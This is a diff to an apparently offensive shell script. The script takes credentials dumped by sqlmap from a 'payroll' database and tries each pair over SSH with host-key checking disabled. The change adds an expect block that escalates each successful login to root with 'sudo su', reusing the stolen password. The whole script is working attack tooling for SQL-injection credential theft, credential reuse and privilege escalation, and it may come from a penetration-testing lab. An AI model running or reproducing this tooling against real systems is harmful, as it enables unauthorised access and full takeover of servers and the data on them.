@@ -13,11 +13,32 @@ sqlmap -r request.txt -D payroll --tables --dump -C "username, password" | grep 
 # Loop through each line in the credentials file
 while IFS=' ' read -r username password
 do
+    echo ""
     echo "Trying to connect as $username ..."
 
-    # Try to SSH and run the groups command, using password authentication
-    sshpass -p "$password" ssh -n $username@$SERVER_IP "groups"
-    echo ""
+    # Use expect to try to SSH and run sudo su
+    expect -c "
+    set timeout 20
+    spawn ssh -o StrictHostKeyChecking=no $username@$SERVER_IP
+    expect \"password:\"
+    send \"$password\r\"
+    expect \"$ \"
+    send \"sudo su\r\"
+    expect {
+        \"password for $username:\" {
+            send \"$password\r\"
+            expect \"# \"
+            send \"exit\r\"
+            expect \"$ \"
+        }
+        \"# \" {
+            # Already root, no password needed
+        }
+    }
+    send \"exit\r\"
+    expect eof
+    "
+
     # Check if the SSH connection was successful
     if [ $? -eq 0 ]; then
         echo "Successful login with username: $username"
@@ -25,6 +46,5 @@ do
     else
         echo "Failed to connect with username: $username"
     fi
-
 done < "mysql-username_password.txt"
 
